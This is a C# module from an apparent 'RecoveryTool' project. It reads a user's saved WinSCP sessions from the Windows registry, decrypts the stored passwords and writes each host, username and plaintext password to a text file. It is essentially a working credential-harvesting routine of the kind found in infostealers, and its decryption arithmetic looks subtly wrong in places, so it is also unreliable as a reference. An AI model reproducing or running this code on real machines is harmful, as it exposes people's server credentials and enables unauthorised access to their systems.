using Microsoft.Win32;
using RecoveryTool.Recovery.Utilities;
using System.Text;

namespace RecoveryTool.Recovery.System.FTPClients
{
    public class WinSCPService
    {
        private const string RegistryPath = @"SOFTWARE\Martin Prikryl\WinSCP 2\Sessions";
        private const int CheckFlag = 255;
        private const int Magic = 163;

        public static async Task SaveWinscpAsync()
        {
            var sessionKeys = GetRegistrySubKeys(RegistryPath);
            if (sessionKeys == null || !sessionKeys.Any())
                return;

            string winscpSessionPath = Common.EnsureWinscpPath();
            string outputPath = Path.Combine(winscpSessionPath, "Content.txt");
            var output = new StringBuilder("WinSCP Sessions\n\n");

            foreach (var sessionKey in sessionKeys)
            {
                string sessionPath = Path.Combine(RegistryPath, sessionKey);
                var (hostname, username, password) = GetSessionInfo(sessionPath);

                output.AppendLine($"Session  : {sessionKey}")
                      .AppendLine($"Hostname : {hostname}")
                      .AppendLine($"Username : {username}")
                      .AppendLine($"Password : {password}\n");
            }

            await File.WriteAllTextAsync(outputPath, output.ToString());
        }

        private static string GetRegistryValue(string subKey, string valueName)
        {
            using var key = Registry.CurrentUser.OpenSubKey(subKey);
            return key?.GetValue(valueName) as string;
        }

        private static string[] GetRegistrySubKeys(string subKey)
        {
            using var key = Registry.CurrentUser.OpenSubKey(subKey);
            return key?.GetSubKeyNames();
        }

        private static (string hostname, string username, string password) GetSessionInfo(string sessionPath)
        {
            string hostname = GetRegistryValue(sessionPath, "HostName");
            string username = GetRegistryValue(sessionPath, "UserName");
            string encryptedPassword = GetRegistryValue(sessionPath, "Password");
            string password = encryptedPassword != null
                ? DecryptWinSCPPassword(hostname, username, encryptedPassword)
                : "No password saved";

            return (hostname, username, password);
        }

        private static string DecryptWinSCPPassword(string sessionHostname, string sessionUsername, string password)
        {
            string key = sessionHostname + sessionUsername;
            var (flag, remainingPass) = DecryptNextCharacterWinSCP(password);

            if (flag == CheckFlag)
            {
                remainingPass = remainingPass[2..];
                (flag, remainingPass) = DecryptNextCharacterWinSCP(remainingPass);
            }

            int len = flag;
            (_, remainingPass) = DecryptNextCharacterWinSCP(remainingPass);
            remainingPass = remainingPass[(flag * 2)..];

            var finalOutput = new StringBuilder(len);
            for (int i = 0; i < len; i++)
            {
                (flag, remainingPass) = DecryptNextCharacterWinSCP(remainingPass);
                finalOutput.Append((char)flag);
            }

            return flag == CheckFlag ? finalOutput.ToString()[key.Length..] : finalOutput.ToString();
        }

        private static (int flag, string remainingPass) DecryptNextCharacterWinSCP(string remainingPass)
        {
            int firstVal = "0123456789ABCDEF".IndexOf(remainingPass[0]) * 16;
            int secondVal = "0123456789ABCDEF".IndexOf(remainingPass[1]);
            int added = firstVal + secondVal;
            int decryptedResult = (((-~(added ^ Magic)) % 256) + 256) % 256;
            return (decryptedResult, remainingPass[2..]);
        }
    }
}